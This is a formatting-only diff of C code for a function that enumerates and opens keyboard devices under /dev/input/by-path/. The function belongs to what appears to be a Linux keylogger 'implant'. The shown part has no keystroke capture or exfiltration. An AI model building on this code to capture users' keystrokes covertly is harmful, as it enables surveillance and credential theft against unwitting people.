@@ -19,8 +19,7 @@
 #include <unistd.h>
 
 static int
-is_kbd(const struct dirent* f)
-{
+is_kbd(const struct dirent *f) {
     size_t len = strlen(f->d_name);
 
     if (len < 3)
@@ -30,9 +29,7 @@ is_kbd(const struct dirent* f)
            f->d_name[len - 1] == 'd';
 }
 
-void
-fetch_available_keyboards(implant_t* instance)
-{
+void fetch_available_keyboards(implant_t *instance) {
 
     /*
         input devices usually live in /dev/input/
@@ -45,12 +42,11 @@ fetch_available_keyboards(implant_t* instance)
         as a NULL value
     */
 
-    struct dirent** char_devices = NULL;
+    struct dirent **char_devices = NULL;
     int possible_paths =
-      scandir("/dev/input/by-path/", &char_devices, &is_kbd, &alphasort);
+        scandir("/dev/input/by-path/", &char_devices, &is_kbd, &alphasort);
 
-    if (-1 == possible_paths || 0 > chdir("/dev/input/by-path/"))
-    {
+    if (-1 == possible_paths || 0 > chdir("/dev/input/by-path/")) {
 
 #ifdef DEBUG
         DEBUG_LOG("could not find possible keyboard paths");
@@ -62,11 +58,9 @@ fetch_available_keyboards(implant_t* instance)
     /* prepare TAILQ  */
     TAILQ_INIT(&instance->kbd);
 
-    char rpath[2048] = { 0 };
-    for (int ctr = -1; ++ctr < possible_paths;)
-    {
-        if (!realpath(char_devices[ctr]->d_name, rpath))
-        {
+    char rpath[2048] = {0};
+    for (int ctr = -1; ++ctr < possible_paths;) {
+        if (!realpath(char_devices[ctr]->d_name, rpath)) {
 
 #ifdef DEBUG
             DEBUG_LOG("[!] Could not run realpath(%s): %s", char_devices[ctr]->d_name, strerror(errno));
@@ -75,9 +69,8 @@ fetch_available_keyboards(implant_t* instance)
             continue;
         }
 
-        keyboard_t* kbd = malloc(sizeof(keyboard_t));
-        if (!kbd)
-        {
+        keyboard_t *kbd = malloc(sizeof(keyboard_t));
+        if (!kbd) {
 
 #ifdef DEBUG
             DEBUG_LOG("[!] allocate memory for keyboard_t");
@@ -87,8 +80,7 @@ fetch_available_keyboards(implant_t* instance)
         }
 
         kbd->fd = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
-        if (kbd->fd < 0)
-        {
+        if (kbd->fd < 0) {
 
 #ifdef DEBUG
             DEBUG_LOG("[!] Could not open %s: %s", rpath, strerror(errno));
